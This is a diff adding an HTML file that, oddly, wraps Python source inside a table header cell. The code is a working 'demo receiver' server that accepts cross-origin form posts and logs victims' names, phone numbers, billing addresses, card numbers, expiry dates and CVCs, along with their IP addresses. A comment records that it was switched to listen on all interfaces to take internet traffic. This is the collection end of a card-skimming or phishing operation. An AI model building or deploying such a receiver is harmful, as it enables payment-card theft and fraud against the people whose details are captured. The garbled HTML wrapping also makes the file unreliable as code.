@@ -1,0 +1,86 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>receiver</title><style>body{font:15px/1.6 -apple-system,Segoe UI,Roboto,sans-serif;padding:28px;color:#1e293b}table{border-collapse:collapse;width:100%}th,td{border:1px solid #e2e8f0;padding:8px 10px;text-align:left}th{background:#f8fafc}</style></head><body><table><thead><tr><th>from datetime import datetime
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import json
+import os
+from urllib.parse import parse_qs
+
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+LOG_FILE = os.path.join(BASE_DIR, &quot;demo_submissions.txt&quot;)
+
+
+def format_entry(data: dict, client_ip: str, user_agent: str) -&gt; str:
+    timestamp = datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S&quot;)
+    name = data.get(&quot;fullName&quot;, &quot;&quot;).strip() or &quot;—&quot;
+    phone = data.get(&quot;phone&quot;, &quot;&quot;).strip() or &quot;—&quot;
+    address = data.get(&quot;address&quot;, &quot;&quot;).strip() or &quot;—&quot;
+    city = data.get(&quot;city&quot;, &quot;&quot;).strip() or &quot;—&quot;
+    zip_code = data.get(&quot;zipCode&quot;, &quot;&quot;).strip() or &quot;—&quot;
+    card = data.get(&quot;cardNumber&quot;, &quot;&quot;).strip() or &quot;—&quot;
+    expiry = data.get(&quot;expiry&quot;, &quot;&quot;).strip() or &quot;—&quot;
+    cvc = data.get(&quot;cvc&quot;, &quot;&quot;).strip() or &quot;—&quot;
+
+    return (
+        &quot;=&quot; * 48 + &quot;\n&quot;
+        f&quot;SUBMISSION | {timestamp} | IP: {client_ip}\n&quot;
+        f&quot;User-Agent : {user_agent}\n&quot;
+        &quot;-&quot; * 48 + &quot;\n&quot;
+        f&quot;Full Name      : {name}\n&quot;
+        f&quot;Phone Number   : {phone}\n&quot;
+        f&quot;Billing Address: {address}\n&quot;
+        f&quot;City / ZIP     : {city}, {zip_code}\n&quot;
+        f&quot;Card Number    : {card}\n&quot;
+        f&quot;Expiry / CVC   : {expiry} / {cvc}\n&quot;
+        + &quot;=&quot; * 48
+        + &quot;\n\n&quot;
+    )
+
+
+class DemoReceiverHandler(BaseHTTPRequestHandler):
+
+    def _cors_headers(self):
+        self.send_header(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;)
+        self.send_header(&quot;Access-Control-Allow-Methods&quot;, &quot;POST, OPTIONS&quot;)
+        self.send_header(&quot;Access-Control-Allow-Headers&quot;, &quot;Content-Type&quot;)
+
+    def do_OPTIONS(self):
+        self.send_response(204)
+        self._cors_headers()
+        self.end_headers()
+
+    def do_POST(self):
+        length = int(self.headers.get(&quot;Content-Length&quot;, 0))
+        raw = self.rfile.read(length).decode(&quot;utf-8&quot;, errors=&quot;replace&quot;)
+        ctype = self.headers.get(&quot;Content-Type&quot;, &quot;&quot;)
+
+        if &quot;application/json&quot; in ctype:
+            payload = json.loads(raw) if raw else {}
+        else:
+            payload = {k: v[0] for k, v in parse_qs(raw).items()}
+
+        block = format_entry(
+            payload,
+            self.client_address[0],
+            self.headers.get(&quot;User-Agent&quot;, &quot;unknown&quot;),
+        )
+
+        with open(LOG_FILE, &quot;a&quot;, encoding=&quot;utf-8&quot;) as f:
+            f.write(block)
+
+        print(f&quot;[+] Appended entry to {LOG_FILE}&quot;)
+
+        self.send_response(200)
+        self._cors_headers()
+        self.send_header(&quot;Content-Type&quot;, &quot;application/json&quot;)
+        self.end_headers()
+        self.wfile.write(b'{&quot;ok&quot;:true}')
+
+    def log_message(self, format, *args):
+        return
+
+
+if __name__ == &quot;__main__&quot;:
+    # CHANGED: 127.0.0.1 to 0.0.0.0 to accept connections from the internet
+    server = HTTPServer((&quot;0.0.0.0&quot;, 8787), DemoReceiverHandler)
+    print(&quot;Listening on http://0.0.0.0:8787 (All interfaces)&quot;)
+    print(f&quot;Single log file: {LOG_FILE}&quot;)
+    server.serve_forever()</th></tr></thead><tbody></tbody></table></body></html>
